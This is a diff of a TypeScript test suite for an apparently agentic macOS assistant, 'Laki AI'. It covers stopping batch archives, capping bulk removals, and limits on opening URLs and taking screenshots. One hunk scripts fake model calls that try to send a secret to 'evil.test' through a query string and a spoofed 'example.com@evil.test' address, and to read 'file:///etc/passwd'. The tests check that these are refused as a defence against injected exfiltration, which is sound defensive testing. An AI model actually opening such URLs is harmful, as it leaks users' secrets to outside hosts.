@@ -672,12 +672,38 @@ test('ai: several deleted or archived at one Yes: the ticked ones, each one’s 
   assert.deepEqual(await rig.rpc('aiAnswer', { id: m.ask.id, n: 0 }), { done: 1, failed: 1, kept: 0 }, 'the archive asked before it: three archived, four is gone')
   assert.equal(await has(c.id), false)
   assert.match((await last()).text, /^Archived 1: three\. Archived in the sidebar brings them back\.\n\n1 is still there:\n- four: not archived: /)
+  assert.equal((await rig.rpc('aiState')).busy, false, 'at work only while it does them')
+  // Stop while it does them: the one under way ends, the rest stay and say so
+  const more = await Promise.all(['six', 'seven', 'eight', 'nine'].map(name => rig.rpc('wsNew', { project: p.id, preset: 'shell', name })))
+  or.answers.push(calls(['laki_archive', { ids: more.map(w => w.id) }]))
+  await rig.rpc('aiAsk', { text: 'archive six to nine' })
+  const going = rig.rpc('aiAnswer', { id: (await last()).ask.id, n: 0 })
+  await until(async () => (await rig.rpc('aiState')).busy, 'at work on them')
+  await assert.rejects(rig.rpc('aiNew'), /at work: stop it first/)
+  assert.deepEqual(await rig.rpc('aiStop'), { stopped: true })
+  const r = await going
+  assert.ok(r.failed >= 1 && r.done + r.failed === 4, JSON.stringify(r))
+  assert.match((await last()).text, /- nine: not archived: stopped$/)
+  assert.equal(await has(more[3].id), true)
+  // more than one question holds: the first 50, the rest said to the model
+  const todos: string[] = []
+  for (let i = 0; i < 52; i++) todos.push((await rig.rpc('todoAdd', { project: p.id, text: `todo ${i}` })).id)
+  or.answers.push(calls(['laki_remove', { kind: 'todo', ids: todos }]))
+  await rig.rpc('aiAsk', { text: 'remove all my to-dos' })
+  assert.deepEqual([(await last()).ask.act.items.length, (await last()).ask.options[0]], [50, 'Yes, remove 50'])
   // a question whose pick goes back to the model still closes with the next ask
   or.answers.push(calls(['laki_ask', { question: 'Which?', options: ['A', 'B'] }]), reply({ content: 'ok' }))
   await rig.rpc('aiAsk', { text: 'pick one' })
   const which = await last()
   await rig.rpc('aiAsk', { text: 'never mind' })
   await assert.rejects(rig.rpc('aiAnswer', { id: which.ask.id, n: 0 }), /a newer ask came since/)
+})
+
+test('ai: a Yes to several that the daemon ended in the middle of says so on the rows it left', async t => {
+  const rig = await fresh(t)
+  const items = [{ id: 'a', label: 'one', said: 'archived' }, { id: 'b', label: 'two', said: '…' }, { id: 'c', label: 'three' }, { id: 'd', label: 'four', said: 'kept' }]
+  writeFileSync(join(rig.data, 'ai-chat.json'), JSON.stringify({ chat: [{ role: 'ai', text: 'Archive these 4 workspaces?', at: 1, ask: { id: 'q1', options: ['Yes, archive 3', 'No, keep them'], picked: 'Yes, archive 3', act: { kind: 'archive', id: 'a', label: '', items } } }], at: 1 }))
+  assert.deepEqual((await rig.rpc('aiState')).chat[0].ask.act.items.map((i: any) => i.said), ['archived', 'not known: Laki quit meanwhile', 'not done: Laki quit meanwhile', 'kept'])
 })
 
 // Q14: Laki AI's eyes and hands: a screenshot it sees and shows, an app opened, a project's scripts started, an
@@ -721,11 +747,11 @@ test('ai: laki_screenshot shows the picture and gives it to the model, the whole
 
   // an app and a web address opened (the fake open records it); a name that isn't one, a file: refused. Only a site
   // the user named, or this Mac's own: what it read elsewhere can't send it anywhere
-  or.answers.push(calls(['laki_open_app', { app: 'Safari', url: 'https://example.com/docs' }], ['laki_open_app', { url: 'https://evil.test/?d=secret' }], ['laki_open_app', { url: 'http://localhost:3000/' }], ['laki_open_app', { app: '-x' }], ['laki_open_app', { url: 'file:///etc/passwd' }]), reply({ content: 'Opened.' }))
+  or.answers.push(calls(['laki_open_app', { app: 'Safari', url: 'https://example.com/docs' }], ['laki_open_app', { url: 'https://evil.test/?d=secret' }], ['laki_open_app', { url: 'https://ample.com/' }], ['laki_open_app', { url: 'https://example.com@evil.test/' }], ['laki_open_app', { url: 'http://localhost:3000/' }], ['laki_open_app', { app: '-x' }], ['laki_open_app', { url: 'file:///etc/passwd' }]), reply({ content: 'Opened.' }))
   assert.deepEqual(await rig.rpc('aiAsk', { text: 'open the docs on Example.com in Safari' }), { text: 'Opened.' })
   assert.doesNotMatch(readFileSync(rig.env.FAKE_LOG, 'utf8'), /evil\.test/)
   assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^open -a Safari https:\/\/example\.com\/docs$/m)
-  assert.deepEqual(or.hits[1].body.messages.slice(-5).map((m: any) => m.content), ['{"opened":"Safari","with":"https://example.com/docs"}', "failed: not opened: the user didn't name evil.test. Give them the link to click, or ask them first (laki_ask)", '{"opened":"http://localhost:3000/"}', 'failed: an app by its name, as Applications has it (Safari, Xcode, Simulator)', 'failed: a web address: http or https'])
+  assert.deepEqual(or.hits[1].body.messages.slice(-7).map((m: any) => m.content), ['{"opened":"Safari","with":"https://example.com/docs"}', "failed: not opened: the user didn't name evil.test. Give them the link to click, or ask them first (laki_ask)", "failed: not opened: the user didn't name ample.com. Give them the link to click, or ask them first (laki_ask)", 'failed: a web address: http or https, no user in it', '{"opened":"http://localhost:3000/"}', 'failed: an app by its name, as Applications has it (Safari, Xcode, Simulator)', 'failed: a web address: http or https'])
 
   // a screenshot: stand-ins for osascript (the windows, Screen Recording on), screencapture (a PNG) and sips
   const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64')
@@ -735,22 +761,30 @@ test('ai: laki_screenshot shows the picture and gives it to the model, the whole
   bin('screencapture', 'echo "screencapture $*" >> "$FAKE_LOG"; for a; do last=$a; done; cp "$HOME/one.png" "$last"')
   bin('sips', 'exit 0')
   const n = or.hits.length
-  or.answers[n] = calls(['laki_screenshot', { of: 'screen' }], ['laki_screenshot', { of: 'safari' }])
+  or.answers[n] = calls(['laki_screenshot', { of: 'screen' }], ['laki_screenshot', { of: 'Mail' }], ['laki_screenshot', { of: 'safari' }])
   or.answers[n + 1] = reply({ content: 'It shows the docs.' })
   assert.deepEqual(await rig.rpc('aiAsk', { text: 'is the page in Safari right?' }), { text: 'It shows the docs.' })
   const round = or.hits[n + 1].body.messages
-  assert.match(round.at(-3).content, /^failed: not taken: Laki AI looks at the whole screen only when the user asks it to/, 'nobody asked to see the screen')
+  assert.match(round.at(-4).content, /^failed: not taken: Laki AI looks at the whole screen only when the user asks it to/, 'nobody asked to see the screen')
+  assert.match(round.at(-3).content, /^failed: not taken: the user didn't ask to look at Mail/, 'nor named that app')
   assert.match(round.at(-2).content, /^\{"path":".+\/images\/[^"]+\.png","of":"Safari: Docs"/)
   assert.deepEqual([round.at(-1).role, round.at(-1).content.map((c: any) => c.type), round.at(-1).content[1].image_url.url.slice(0, 22)], ['user', ['text', 'image_url'], 'data:image/png;base64,'], 'the model sees it')
   const shown = (await rig.rpc('aiState')).chat.find((m: any) => m.role === 'ai' && m.images)
-  assert.deepEqual([shown.text, shown.images.length], ['Screenshot of Safari: Docs.', 1], 'and the user, in the chat')
+  assert.deepEqual([shown.text, shown.images.length], ['Screenshot of Safari.', 1], "and the user, in the chat: the app's name, not its window's title (a page's own words)")
   assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^screencapture -x -o -l 7 /m)
   // asked to look at the screen: the main display whole
-  or.answers[or.hits.length] = calls(['laki_screenshot', {}])
+  or.answers[or.hits.length] = calls(['laki_screenshot', { of: 'my screen' }])
   or.answers[or.hits.length + 1] = reply({ content: 'I see it.' })
   await rig.rpc('aiAsk', { text: 'look at my screen: what is wrong?' })
   assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^screencapture -x -m /m)
   assert.equal(said(or.hits.length - 1).role, 'user')
+  // a model that takes no pictures refuses the round they came with: once more without them, and it says so
+  const k = or.hits.length
+  or.answers[k] = calls(['laki_screenshot', { of: 'Safari' }])
+  or.answers[k + 1] = { status: 404, error: { code: 404, message: 'No endpoints found that support image input' } }
+  or.answers[k + 2] = reply({ content: 'I can’t see it with this model.' })
+  assert.deepEqual(await rig.rpc('aiAsk', { text: 'look at Safari' }), { text: 'I can’t see it with this model.' })
+  assert.match(said(k + 2).content, /^The screenshot didn't reach you \(.*image input/)
 })
 
 test('ai: findSessions ranks by name, then branch and the rest; filters; says when two fit about as well', () => {
@@ -778,7 +812,8 @@ test('ai: findSessions ranks by name, then branch and the rest; filters; says wh
   assert.deepEqual([merged.found, merged.sessions.length, merged.more], [27, 27, undefined], 'all 27, not the first 10')
   assert.deepEqual(merged.sessions.find((x: any) => x.id === 'm1'), { id: 'm1', name: 'ws 1', project: 'Shop', group: undefined, branch: undefined, created: '2026-11-10 09:00', active: undefined, pr: { number: 1, title: 'PR 1', state: 'MERGED' }, agents: 'claude idle' })
   assert.deepEqual([findSessions(many, { pr: 'none' }).found, findSessions(many, { pr: 'any' }).found, findSessions(many, { pr: 'open' }).found], [5, 55, 28])
-  assert.match(findSessions(many, { pr: 'any' }).more ?? '', /^5 more fit and are not listed here \(they exist\): last: 50 lists them$/)
+  assert.match(findSessions(many, { pr: 'any' }).more ?? '', /^5 more fit and are not listed here \(they exist\): 50 is the most one list holds, a narrower filter/, 'no last lists them')
+  assert.match(findSessions(many, { pr: 'merged', last: 5 }).more ?? '', /^22 more fit and are not listed here \(they exist\): last: 27 lists them$/)
   assert.match(findSessions(many, {}).more ?? '', /^50 more fit/)
   assert.ok(JSON.stringify(findSessions(many, { pr: 'any' })).length < 12000, 'what the model may read of it')
 })
